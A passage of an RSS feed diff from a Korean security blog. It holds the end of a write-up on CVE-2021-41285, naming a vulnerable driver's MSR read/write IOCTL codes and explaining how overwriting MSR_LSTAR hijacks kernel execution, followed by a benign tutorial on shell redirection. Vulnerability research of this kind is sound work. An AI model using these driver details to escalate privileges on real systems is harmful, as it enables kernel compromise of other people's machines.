&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li>MSR &#xC4F0;&#xAE30;<ul><li>Model-Specific Registers(MSRs)&#xB294; &#xC8FC;&#xB85C; CPU &#xC815;&#xBCF4;&#xB97C; &#xAC00;&#xC838;&#xC624;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xC911; <code>MSR _LSTAR</code>&#xC740; &#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; &#xCEE4;&#xB110;&#xBAA8;&#xB4DC;&#xB85C; &#xC804;&#xD658;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294;&#xB370;, &#xC774; &#xB54C; <code>MSR _LSTAR</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xC77D;&#xACE0; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB85C; call &#xD569;&#xB2C8;&#xB2E4;. <code>MSR _LSTAR</code>&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xBA74; &#xC2E4;&#xD589; &#xD750;&#xB984;&#xC744; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><code>0x9C402084: __readmsr</code></li><li><code>0x9C402088: __writemsr</code></li><li>MSR&#xC744; &#xC77D;&#xACE0; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li></ol>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/driver/">driver</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/cve-2021-41285/">cve-2021-41285</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/ioctl/">ioctl</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/3rd-party-driver/">3rd party driver</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/arbitrary-read-write/">arbitrary read write</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/10/09/j0ker/2021-10-09/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[해키피디아] Redirection</title>
-      <link>https://hackyboiz.github.io/2021/10/08/poosic/redirection/</link>
-      <guid>https://hackyboiz.github.io/2021/10/08/poosic/redirection/</guid>
-      <pubDate>Fri, 08 Oct 2021 05:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;p&gt;&amp;#xB9AC;&amp;#xB2E4;&amp;#xC774;&amp;#xB809;&amp;#xC158;&amp;#xC740; &amp;#xB300;&amp;#xBD80;&amp;#xBD84;&amp;#xC758; CLI(Command Line Interpreter)&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<p>&#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xC158;&#xC740; &#xB300;&#xBD80;&#xBD84;&#xC758; CLI(Command Line Interpreter)&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xBA85;&#xB839;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xBA85;&#xB839;&#xC5B4;&#xB294; &#xD45C;&#xC900; &#xC785;&#xCD9C;&#xB825;&#xC5D0; &#xB300;&#xD55C; &#xBC29;&#xD5A5;&#xC744; &#xBC14;&#xAFD4; &#xD30C;&#xC77C;&#xB85C; &#xC785;&#xB825;&#xC744; &#xBC1B;&#xAC70;&#xB098; &#xD30C;&#xC77C;&#xB85C; &#xCD9C;&#xB825;&#xC744; &#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="&#xBA85;&#xB839;&#xC5B4;"><a href="#&#xBA85;&#xB839;&#xC5B4;" class="headerlink" title="&#xBA85;&#xB839;&#xC5B4;"></a>&#xBA85;&#xB839;&#xC5B4;</h3><pre><code class="hljs bash">&#xBA85;&#xB839;&#xC5B4;1 &gt; &#xD30C;&#xC77C;&#xBA85;&#xB839;&#xC5B4;1 &gt;&gt; &#xD30C;&#xC77C;&#xBA85;&#xB839;&#xC5B4;1 &lt; &#xD30C;&#xC77C;</code></pre><p><code>&gt;</code>&#xB294; &#xD45C;&#xC900; &#xCD9C;&#xB825; &#xC7AC;&#xC9C0;&#xC815; &#xBA85;&#xB839;&#xC5B4;&#xB85C;&#xC368;, &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xC2E4;&#xD589; &#xACB0;&#xACFC;&#xB97C; &#xD45C;&#xC900; &#xCD9C;&#xB825;&#xC774; &#xC544;&#xB2CC; &#xC7AC;&#xC9C0;&#xC815;&#xD55C; &#xACF3;&#xC73C;&#xB85C; &#xBCF4;&#xB0B4; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. <code>&gt;&gt;</code>&#xB294; &#xB611;&#xAC19;&#xC740; &#xD45C;&#xC900; &#xCD9C;&#xB825; &#xC7AC;&#xC9C0;&#xC815; &#xBA85;&#xB839;&#xC5B4;&#xC9C0;&#xB9CC;, &#xC2E4;&#xD589; &#xACB0;&#xACFC;&#xB97C; &#xC7AC;&#xC9C0;&#xC815;&#xD55C; &#xD30C;&#xC77C;&#xC758; &#xB4A4;&#xCABD;&#xC5D0; &#xC774;&#xC5B4;&#xC11C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>&lt;</code>&#xB294; &#xC774;&#xC640; &#xBC18;&#xB300;&#xB85C; &#xD45C;&#xC900; &#xC785;&#xB825; &#xC7AC;&#xC9C0;&#xC815; &#xBA85;&#xB839;&#xC5B4;&#xC785;&#xB2C8;&#xB2E4;. &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xC785;&#xB825;&#xC73C;&#xB85C;&#xC368; &#xD45C;&#xC900; &#xC785;&#xB825;&#xACFC; &#xC5F0;&#xACB0;&#xB41C; &#xD0A4;&#xBCF4;&#xB4DC; &#xB300;&#xC2E0; &#xC7AC;&#xC9C0;&#xC815;&#xD55C; &#xACF3;&#xC744; &#xC785;&#xB825;&#xC73C;&#xB85C; &#xBC1B;&#xC544; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798; &#xC2E4;&#xC81C; &#xC0AC;&#xC6A9; &#xC608;&#xC2DC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/10/08/poosic/redirection/image1.png" alt></p><p> cat &#xBA85;&#xB839;&#xC5B4;&#xC640; &#xD14D;&#xC2A4;&#xD2B8; &#xD30C;&#xC77C;&#xB85C; &#xAD6C;&#xD604;&#xD55C; &#xAC04;&#xB2E8;&#xD55C; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xC158;&#xC758; &#xC608;&#xC2DC;&#xC785;&#xB2C8;&#xB2E4;. cat &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xD45C;&#xC900; &#xCD9C;&#xB825;&#xC744; &#xD1B5;&#xD574; &#xD654;&#xBA74;&#xC5D0; &#xCD9C;&#xB825;&#xB418;&#xB358; &#x201C;We are Hackyboiz!&#x201D;&#xB77C;&#xB294; &#xBB38;&#xC7A5;&#xC744; hackyboizt.txt&#xB85C; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xC158;&#xC2DC;&#xCF1C; &#xCD9C;&#xB825; &#xACB0;&#xACFC;&#xB97C; &#xC800;&#xC7A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xB2E4;&#xC2DC; hackyboiz.txt &#xD30C;&#xC77C;&#xC744; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xC158;&#xC2DC;&#xCF1C; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC744; &#xC785;&#xB825;&#xC73C;&#xB85C; &#xBC1B;&#xC544; cat &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xCF30;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/10/08/poosic/redirection/image2.png" alt></p><p>&#xC774;&#xD6C4; <code>&gt;&gt;</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC800;&#xC7A5;&#xB41C; &#x201C;We are Hackyboiz!&#x201D;&#xB77C;&#xB294; &#xBB38;&#xC7A5;&#xC740; &#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD558;&#xC600;&#xB4EF;&#xC774; &#xD30C;&#xC77C;&#xC758; &#xB4B7; &#xBD80;&#xBD84;&#xC5D0; &#xD45C;&#xC900; &#xCD9C;&#xB825;&#xC758; &#xACB0;&#xACFC;&#xAC00; &#xC774;&#xC5B4;&#xC11C; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/redirection/">redirection</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/10/08/poosic/redirection/#disqus_thread</comments>
       
     </item>
     
